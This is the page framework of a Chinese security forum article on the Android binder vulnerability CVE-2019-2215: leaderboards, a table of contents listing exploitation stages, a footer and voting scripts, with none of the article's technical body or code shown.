            <p><strong>先知社区</strong></p>
            <hr>
            <p class="text-center login-btn">
                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F6853&amp;from_type=xianzhi" class="btn">现在登录</a>
            </p>
        </div>
    </div>


<div class="box">
    <div class="hot-node notice">
        <div class="info-body" style="padding: 15px;">
            <a href="https://xz.aliyun.com/t/7739" target="_blank">
            <img src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/20200508094357-62057bf0-90cd-1.jpg" style="border-radius: 2px;" alt="阿里云情报奖励X计划">
            </a>
        </div>
    </div>
</div>


    <div class="box">
        <div class="hot-node notice">
            <div class="info-body">
                <a href="https://xz.aliyun.com/notice" style="padding: 4px 10px 4px 10px;">社区小黑板</a>
            </div>
        </div>
    </div>


<div class="box">
    <div class="global-charts">
        <div id="chart-header">
            <div class="col-sm-4 text-center charts" data-type="year">
                年度贡献榜
            </div>
            <div class="text-center charts active" data-type="month">
                月度贡献榜
            </div>
            <div class="clearfix"></div>
        </div>
        <div id="chart_body">
            <div class="info-body" data-type="year">

                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/12258_890ed8f20bc8ce34d7.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/12258" title="Y4er">Y4er</a>
                            <span class="num-box">
                                <span class="badge badge-important">20</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/31688_7fde7d5cec75cd84ff.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/31688" title="WHOAMIBunny">WHOAMIBunny</a>
                            <span class="num-box">
                                <span class="badge badge-important">19</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/3819" title="xq17">xq17</a>
                            <span class="num-box">
                                <span class="badge badge-important">16</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/46958_c5e127fea01d28ebaf.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/46958" title="j1ang">j1ang</a>
                            <span class="num-box">
                                <span class="badge badge-important">15</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/5791_412c2e534e4220d76c.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/5791" title="深信服千里目安全实验室">深信服千里目安全实验室</a>
                            <span class="num-box">
                                <span class="badge badge-important">13</span>
                            </span>
                        </div>

                    </div>
                
            </div>
            <div class="info-body" data-type="month">
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/35272" title="changeServer" style="">changeServer</a>
                            <span class="num-box">
                                <span class="badge badge-important">1</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/47531_3e9cdd3901c1aac924.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/47531" title="dawntown" style="">dawntown</a>
                            <span class="num-box">
                                <span class="badge badge-important">1</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/38774" title="H3rmesk1t" style="">H3rmesk1t</a>
                            <span class="num-box">
                                <span class="badge badge-important">1</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/48395" title="mingyeqf" style="">mingyeqf</a>
                            <span class="num-box">
                                <span class="badge badge-important">1</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/50951" title="是juju呀" style="">是juju呀</a>
                            <span class="num-box">
                                <span class="badge badge-important">1</span>
                            </span>
                        </div>
                    </div>
                
            </div>
        </div>

    </div>
</div>

    <div class="box sfixed" id="toc-container" style="width: 270px;">
        <div class="panel-info">
            <div class="panel-heading">
                <h4>目录</h4>
            </div>
            <div id="toc">
                <div class="high-light" style="display: block; background-color: rgb(243, 243, 243); position: absolute; height: 26px; top: 440px;"></div>
            <ol style="top: 50px;"><li><a href="https://xz.aliyun.com/t/6853#toc-0">前言</a></li><li><a href="https://xz.aliyun.com/t/6853#toc-1">binder和vectored I/O的基本概述</a><ol><li><a href="https://xz.aliyun.com/t/6853#toc-2">binder</a></li><li><a href="https://xz.aliyun.com/t/6853#toc-3">vectored I/O</a></li></ol></li><li><a href="https://xz.aliyun.com/t/6853#toc-4">漏洞详情</a><ol><li><a href="https://xz.aliyun.com/t/6853#toc-5">free</a></li><li><a href="https://xz.aliyun.com/t/6853#toc-6">use(after free)</a></li></ol></li><li><a href="https://xz.aliyun.com/t/6853#toc-7">泄漏内核task结构体</a><ol><li><a href="https://xz.aliyun.com/t/6853#toc-8">利用unlink</a></li><li><a href="https://xz.aliyun.com/t/6853#toc-9">触发泄露</a></li></ol></li><li><a href="https://xz.aliyun.com/t/6853#toc-10">建立任意读写原语</a><ol><li><a href="https://xz.aliyun.com/t/6853#toc-11">突破限制</a></li><li><a href="https://xz.aliyun.com/t/6853#toc-12">获得可控制的写入原语</a></li><li><a href="https://xz.aliyun.com/t/6853#toc-13">任意读写辅助函数</a></li><li><a href="https://xz.aliyun.com/t/6853#toc-14">注意事项</a></li></ol></li><li><a href="https://xz.aliyun.com/t/6853#toc-15">结论</a></li><li><a href="https://xz.aliyun.com/t/6853#toc-16">参考资料/其它资源</a></li><li><a href="https://xz.aliyun.com/t/6853#toc-17">感谢</a></li></ol></div>
        </div>
    </div>
    <div style="clear: both;"></div>


    <script type="text/javascript">
        $(function () {
            $(".charts").click(switchChart)

            function switchChart() {
                let _this = $(this);
                let idx = _this.attr("data-type")
                let content = $(`#chart_body>.info-body[data-type='${idx}']`)
                if (!_this.hasClass("active")) {
                    _this.addClass("active").siblings().removeClass("active")
                    content.show().siblings().hide()
                }
            }
        })
    </script>


    <style>

    </style>

        </div>
    </div>


</div>
<footer class="bs-docs-footer">
    <div class="container text-center">
        <div class="links">
            <a href="https://xz.aliyun.com/feed" target="_blank">RSS</a>
            <a href="https://xz.aliyun.com/about" target="_blank"><span>关于社区</span></a>
            <a href="https://xz.aliyun.com/partner" target="_blank"><span>友情链接</span></a>
            <a href="https://xz.aliyun.com/notice">社区小黑板</a>
        </div>
    </div>
</footer>

<script src="https://xz.aliyun.com/static/js/bootstrap.min.js"></script>
<script src="https://xz.aliyun.com/static/js/xz.js"></script>


    
    <script type="text/javascript">
        $(document).ready(function () {
            voteUp = function (topicPk) {
                if (topicPk) {
                    $.ajax({
                        url: '/forum/topic/up/',
                        data: {'pk': topicPk},
                        type: 'post',
                        dataType: 'json',
                        success: function (data) {
                            if (data.not_authenticated) {
                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F6853&amp;from_type=xianzhi'
                            } else {
                                if (data.success) {
                                    $('.t-vote > .vote-up').html(data.html);
                                }
                            }
                        }
                    });
                }
            };
            voteDown = function (topicPk) {
                if (topicPk) {
                    $.ajax({
                        url: '/forum/topic/down/',
                        data: {'pk': topicPk},
                        type: 'post',
                        dataType: 'json',
                        success: function (data) {
                            if (data.not_authenticated) {
                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F6853&amp;from_type=xianzhi'
                            } else {
                                if (data.success) {
                                    $('.t-vote > .vote-down').html(data.html);
                                }
                            }

                        }
                    });
                }
            };
            
        });
    </script>


    <script src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/z_stat.php"></script><script src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/core.php" charset="utf-8" type="text/javascript"></script><a href="https://www.cnzz.com/stat/website.php?web_id=1260716569" target="_blank" title="站长统计">站长统计</a>


<div id="waf_nc_block" style="display: none;"><div class="waf-nc-mask"></div><div id="WAF_NC_WRAPPER" class="waf-nc-wrapper"><img class="waf-nc-icon" src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/robot.png" alt="" height="111" width="150"><p class="waf-nc-description">为保证您的正常访问，请进行如下验证：</p><div id="nocaptcha"></div></div></div></body></html>